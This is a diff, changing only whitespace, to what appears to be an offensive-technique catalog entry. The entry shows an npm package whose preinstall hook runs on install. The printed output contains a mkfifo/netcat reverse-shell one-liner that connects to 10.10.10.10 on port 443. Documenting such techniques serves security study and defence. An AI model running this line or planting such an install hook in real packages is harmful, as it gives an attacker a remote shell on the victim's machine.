@@ -6,13 +6,16 @@ executor: bash
 data: npm i $PACKAGE --unsafe
 output: 'root@kali:# npm i /home/alice/pwnme --unsafe
 
+
   > pwnme@1.0.0 preinstall /home/alice/pwnme
 
   > rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f
 
+
   npm WARN pwnme@1.0.0 No description
 
   npm WARN pwnme@1.0.0 No repository field.
+
 
   up to date in 46.635s
 
@@ -41,3 +44,5 @@ npm WARN pwnme@1.0.0 No repository field.
 up to date in 46.635s
 found 0 vulnerabilities
 ```
+
+
